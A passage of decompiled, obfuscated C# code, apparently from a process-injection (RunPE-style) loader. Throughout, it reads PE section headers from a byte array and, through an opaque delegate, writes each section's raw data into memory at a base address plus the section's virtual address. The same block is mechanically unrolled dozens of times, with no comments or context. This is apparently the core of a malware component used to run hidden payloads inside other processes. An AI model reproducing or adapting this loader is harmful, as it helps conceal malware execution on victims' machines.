					((byte*)ptr)[3811] = ((*(int*)((byte*)ptr + 856) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3811] != 0)
					{
						byte[] array70;
						checked
						{
							array70 = new byte[*unchecked((int*)((byte*)ptr + 856)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 860), array70, 0, array70.Length);
						((byte*)ptr)[3812] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 852))), array70, array70.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3812] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3816] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3816] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 864)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 868)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 872)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3814] = ((*(int*)((byte*)ptr + 868) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3814] != 0)
					{
						byte[] array71;
						checked
						{
							array71 = new byte[*unchecked((int*)((byte*)ptr + 868)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 872), array71, 0, array71.Length);
						((byte*)ptr)[3815] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 864))), array71, array71.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3815] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3819] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3819] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 876)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 880)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 884)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3817] = ((*(int*)((byte*)ptr + 880) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3817] != 0)
					{
						byte[] array72;
						checked
						{
							array72 = new byte[*unchecked((int*)((byte*)ptr + 880)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 884), array72, 0, array72.Length);
						((byte*)ptr)[3818] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 876))), array72, array72.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3818] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3822] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3822] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 888)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 892)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 896)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3820] = ((*(int*)((byte*)ptr + 892) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3820] != 0)
					{
						byte[] array73;
						checked
						{
							array73 = new byte[*unchecked((int*)((byte*)ptr + 892)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 896), array73, 0, array73.Length);
						((byte*)ptr)[3821] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 888))), array73, array73.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3821] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3825] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3825] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 900)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 904)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 908)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3823] = ((*(int*)((byte*)ptr + 904) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3823] != 0)
					{
						byte[] array74;
						checked
						{
							array74 = new byte[*unchecked((int*)((byte*)ptr + 904)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 908), array74, 0, array74.Length);
						((byte*)ptr)[3824] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 900))), array74, array74.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3824] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3828] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3828] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 912)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 916)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 920)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3826] = ((*(int*)((byte*)ptr + 916) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3826] != 0)
					{
						byte[] array75;
						checked
						{
							array75 = new byte[*unchecked((int*)((byte*)ptr + 916)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 920), array75, 0, array75.Length);
						((byte*)ptr)[3827] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 912))), array75, array75.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3827] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3831] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3831] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 924)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 928)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 932)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3829] = ((*(int*)((byte*)ptr + 928) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3829] != 0)
					{
						byte[] array76;
						checked
						{
							array76 = new byte[*unchecked((int*)((byte*)ptr + 928)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 932), array76, 0, array76.Length);
						((byte*)ptr)[3830] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 924))), array76, array76.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3830] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3834] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3834] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 936)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 940)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 944)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3832] = ((*(int*)((byte*)ptr + 940) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3832] != 0)
					{
						byte[] array77;
						checked
						{
							array77 = new byte[*unchecked((int*)((byte*)ptr + 940)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 944), array77, 0, array77.Length);
						((byte*)ptr)[3833] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 936))), array77, array77.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3833] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3837] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3837] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 948)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 952)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 956)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3835] = ((*(int*)((byte*)ptr + 952) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3835] != 0)
					{
						byte[] array78;
						checked
						{
							array78 = new byte[*unchecked((int*)((byte*)ptr + 952)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 956), array78, 0, array78.Length);
						((byte*)ptr)[3836] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 948))), array78, array78.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3836] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3840] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3840] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 960)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 964)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 968)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3838] = ((*(int*)((byte*)ptr + 964) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3838] != 0)
					{
						byte[] array79;
						checked
						{
							array79 = new byte[*unchecked((int*)((byte*)ptr + 964)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 968), array79, 0, array79.Length);
						((byte*)ptr)[3839] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 960))), array79, array79.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3839] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3843] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3843] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 972)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 976)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 980)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3841] = ((*(int*)((byte*)ptr + 976) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3841] != 0)
					{
						byte[] array80;
						checked
						{
							array80 = new byte[*unchecked((int*)((byte*)ptr + 976)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 980), array80, 0, array80.Length);
						((byte*)ptr)[3842] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 972))), array80, array80.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3842] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3846] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3846] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 984)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 988)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 992)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3844] = ((*(int*)((byte*)ptr + 988) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3844] != 0)
					{
						byte[] array81;
						checked
						{
							array81 = new byte[*unchecked((int*)((byte*)ptr + 988)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 992), array81, 0, array81.Length);
						((byte*)ptr)[3845] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 984))), array81, array81.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3845] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3849] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3849] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 996)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1000)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1004)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3847] = ((*(int*)((byte*)ptr + 1000) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3847] != 0)
					{
						byte[] array82;
						checked
						{
							array82 = new byte[*unchecked((int*)((byte*)ptr + 1000)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1004), array82, 0, array82.Length);
						((byte*)ptr)[3848] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 996))), array82, array82.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3848] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3852] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3852] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1008)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1012)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1016)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3850] = ((*(int*)((byte*)ptr + 1012) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3850] != 0)
					{
						byte[] array83;
						checked
						{
							array83 = new byte[*unchecked((int*)((byte*)ptr + 1012)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1016), array83, 0, array83.Length);
						((byte*)ptr)[3851] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1008))), array83, array83.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3851] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3855] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3855] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1020)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1024)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1028)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3853] = ((*(int*)((byte*)ptr + 1024) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3853] != 0)
					{
						byte[] array84;
						checked
						{
							array84 = new byte[*unchecked((int*)((byte*)ptr + 1024)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1028), array84, 0, array84.Length);
						((byte*)ptr)[3854] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1020))), array84, array84.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3854] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3858] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3858] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1032)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1036)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1040)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3856] = ((*(int*)((byte*)ptr + 1036) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3856] != 0)
					{
						byte[] array85;
						checked
						{
							array85 = new byte[*unchecked((int*)((byte*)ptr + 1036)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1040), array85, 0, array85.Length);
						((byte*)ptr)[3857] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1032))), array85, array85.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3857] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3861] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3861] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1044)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1048)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1052)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3859] = ((*(int*)((byte*)ptr + 1048) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3859] != 0)
					{
						byte[] array86;
						checked
						{
							array86 = new byte[*unchecked((int*)((byte*)ptr + 1048)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1052), array86, 0, array86.Length);
						((byte*)ptr)[3860] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1044))), array86, array86.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3860] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3864] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3864] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1056)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1060)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1064)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3862] = ((*(int*)((byte*)ptr + 1060) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3862] != 0)
					{
						byte[] array87;
						checked
						{
							array87 = new byte[*unchecked((int*)((byte*)ptr + 1060)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1064), array87, 0, array87.Length);
						((byte*)ptr)[3863] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1056))), array87, array87.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3863] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3867] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3867] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1068)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1072)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1076)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3865] = ((*(int*)((byte*)ptr + 1072) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3865] != 0)
					{
						byte[] array88;
						checked
						{
							array88 = new byte[*unchecked((int*)((byte*)ptr + 1072)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1076), array88, 0, array88.Length);
						((byte*)ptr)[3866] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1068))), array88, array88.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3866] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3870] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3870] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1080)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1084)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1088)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3868] = ((*(int*)((byte*)ptr + 1084) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3868] != 0)
					{
						byte[] array89;
						checked
						{
							array89 = new byte[*unchecked((int*)((byte*)ptr + 1084)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1088), array89, 0, array89.Length);
